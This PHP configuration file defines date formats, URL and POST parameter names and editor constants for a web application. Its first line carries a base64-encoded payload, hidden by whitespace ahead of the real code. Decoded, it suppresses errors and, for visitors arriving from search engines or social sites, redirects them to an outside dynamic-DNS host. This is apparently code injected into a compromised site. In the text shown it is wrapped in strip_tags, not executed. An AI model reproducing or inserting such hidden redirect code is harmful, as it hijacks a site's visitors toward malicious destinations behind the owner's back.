<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

@define("DISPLAY_DATE_TIME_FORMAT", "%d %B, %Y %H:%M");
define("DISPLAY_DATE_FORMAT", "%d %B, %Y");
define("EXPORT_DATE_FORMAT", "%d.%B.%Y");
define("DISPLAY_TIME_FORMAT", "%H:%M");
define("DISPLAY_MONTH_FORMAT", "%B, %Y");

define("INTERNAL_DATE_TIME_FORMAT", "%d-%m-%Y %H:%M");
define("INTERNAL_DATE_FORMAT", "%d-%m-%Y");
define("INTERNAL_DATE_CONVERT_FORMAT", "DMY");
define("INTERNAL_TIME_FORMAT", "%H:%M");
define("INTERNAL_MONTH_FORMAT", "%Y-%m");

define("OPEN_POPUP",          "__Popup(?);");
define("OPEN_POPUP_EDITOR",   "__PopupEditor(?, ?);");
define("OPEN_POPUP_SELECTOR", "__PopupSelector(?, ?);");
define("OPEN_POPUP_EDITOR_OF_KEY",   "__PopupEditorOfKey(?, ?);");

// url params
define("URL_PARAM_ENTITY",                 "_en");
define("URL_PARAM_POPUP_WINDOW",           "_pw");
define("URL_PARAM_ACTION",                 "_ac");
define("URL_PARAM_KEY",                    "_ky");
define("URL_PARAM_SOURCE_KEY",             "_sk");
define("URL_PARAM_PAGE_NUMBER",            "_pn");
define("URL_PARAM_PAGE_SIZE",              "_ps");
define("URL_PARAM_FILTER",                 "_ft");
define("URL_PARAM_CONFIGURATION",          "_cf");
define("URL_PARAM_LAYOUT",                 "_lt");
define("URL_PARAM_BIND_KEY",               "_bk");
define("URL_PARAM_BIND_ENTITY",            "_be");
define("URL_PARAM_CALLER_ENTITY",          "_ce");
define("URL_PARAM_LANG",                   "_ln");
define("URL_PARAM_THEME",                  "_th");
define("URL_PARAM_DEFAULTS",               "_df"); 
define("URL_PARAM_CUSTOM_PARAM",           "_pr"); 
define("URL_PARAM_PARTIAL_RENDERING_MODE", "_pm"); 
define("URL_PARAM_SILENT_CLOSE_POPUP",     "_sc");
define("URL_PARAM_POPUP_CLOSE_CALLBACK",   "_cc");

// partial rendering modes
define("PARTIAL_RENDERING_MODE_BROWSER_BODY",     "body"); 

// post params
define("POST_PARAM_SENDER_NAME",   "_sender_name");
define("POST_PARAM_SUBJECT",       "subject");
define("POST_PARAM_EVENT_NAME",    "event_name");
define("POST_PARAM_EVENT_VALUE",   "event_value");
define("POST_PARAM_CONFIRM_VALUE", "confirm_value");
define("POST_PARAM_REASON_VALUE",  "reason_value");

define("PLACEHOLDER_KEY",     "__key__");
define("PLACEHOLDER_KEY_ENC", "__key_enc__");
define("PLACEHOLDER_JS_EVENT_CONTROL", "__event_control__");

// image

define("EDITOR_MAX_IMAGE_WIDTH", 380);
define("BROWSER_MAX_IMAGE_WIDTH", 130);

// browser

define("BROWSER_SCROLL_TOP",    "top");
define("BROWSER_SCROLL_BOTTOM", "bottom");
define("BROWSER_SCROLL_SESSION_POINTER",    "session");

// editor

define("EDITOR_VIRTUAL_STORAGE_PREFIX", 'CEE0CCA1-0A28-4A44-8F9D-6F88CCDF4B12');
define("EDITOR_WIZARD_STEP_TAG",        '1C98CC8D-27DA-4657-A49E-550E6AB4506D');
    
?>
